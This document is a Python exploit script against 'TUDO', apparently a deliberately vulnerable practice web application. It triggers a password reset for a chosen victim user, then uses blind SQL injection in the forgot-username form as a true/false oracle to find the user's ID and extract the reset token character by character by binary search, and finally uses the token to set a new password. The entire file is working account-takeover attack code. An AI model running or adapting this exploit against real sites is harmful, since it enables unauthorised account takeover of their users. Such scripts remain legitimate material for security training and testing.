import argparse
import sys

import requests

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Reset a TUDO user's password by dumping the reset token via blind SQLi."
    )
    parser.add_argument("target", help="Base target URL, for example http://localhost:8000")
    parser.add_argument("user", help="Victim username, usually user1 or user2")
    parser.add_argument("password", help="New password to set")
    args = parser.parse_args()

    target = args.target.rstrip("/")

    r = requests.post(
        f"{target}/forgotpassword.php",
        data={"username": args.user},
        timeout=10,
    )
    if "Email sent!" not in r.text:
        raise SystemExit("Failed to create reset token for the target user.")
    print(f"[*] Requested password reset for {args.user}")

    def oracle(query: str) -> bool:
        r = requests.post(
            f"{target}/forgotusername.php",
            data={"username": f"{query};--"},
            timeout=10,
        )
        return "User exists!" in r.text

    uid = 0
    while True:
        if oracle(f"{args.user}' and uid={uid}"):
            print(f"[*] Found {args.user}'s UID: {uid}")
            break
        uid += 1

    print("[*] Dumping reset token: ", end="")
    token = ""
    for i in range(32):
        low = 48
        high = 122

        while low <= high:
            mid = (low + high) // 2

            if oracle(
                f"{args.user}' and (select ascii(substring(token,{i + 1},1)) from "
                f"tokens where uid={uid} order by tid limit 1)>'{mid}'"
            ):
                low = mid + 1
            elif oracle(
                f"{args.user}' and (select ascii(substring(token,{i + 1},1)) from "
                f"tokens where uid={uid} order by tid limit 1)<'{mid}'"
            ):
                high = mid - 1
            else:
                token += chr(mid)
                print(chr(mid), end="")
                sys.stdout.flush()
                break
    print()

    r = requests.post(
        f"{target}/resetpassword.php",
        data={"token": token, "password1": args.password, "password2": args.password},
        timeout=10,
    )
    if "Password changed!" not in r.text:
        raise SystemExit("Password reset failed after token extraction.")

    print(f"[+] Set {args.user}'s password to {args.password}")


if __name__ == "__main__":
    main()
